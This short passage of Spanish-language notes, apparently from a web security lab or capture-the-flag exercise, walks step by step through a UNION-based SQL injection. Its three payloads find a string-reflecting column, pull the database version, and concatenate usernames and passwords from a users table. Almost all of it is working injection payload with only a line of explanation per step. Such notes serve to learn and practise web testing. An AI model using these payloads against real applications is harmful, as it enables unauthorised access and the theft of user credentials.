
Se puede usar la segunda columna
```SQL
'+UNION+SELECT+NULL,'a'+--+- 
```

Sacamos la versión de la DB usada
```SQL
'+UNION+SELECT+NULL,version()+--+-
```


Usamos concatenación de strings

![[Pasted image 20241223230156.png]]

```SQL
'+UNION+SELECT+NULL,username||':'||password+FROM+users+--+-
```